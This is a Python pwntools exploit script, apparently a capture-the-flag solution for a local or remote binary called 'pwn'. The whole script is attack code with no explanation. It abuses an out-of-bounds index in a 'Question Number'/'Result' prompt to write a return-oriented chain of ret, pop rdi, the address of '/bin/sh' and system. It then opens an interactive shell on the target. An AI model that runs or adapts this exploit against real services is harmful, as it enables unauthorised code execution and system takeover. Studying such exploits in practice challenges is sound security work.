#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./pwn', checksec=False)
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(elf.path)
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            ''')
    
    return p

p = setup()

bin_sh = next(elf.search(b'/bin/sh\x00'))
system = elf.plt.system
pop_rdi = 0x4012f1
ret = 0x40101a

def answer(idx, val):
    p.sendlineafter(b'Question Number:', str(idx).encode())
    p.sendlineafter(b'Result:', str(val).encode())

answer(0, system)
answer(-1, ret)
answer(-2, bin_sh)
answer(-3, pop_rdi)

p.interactive()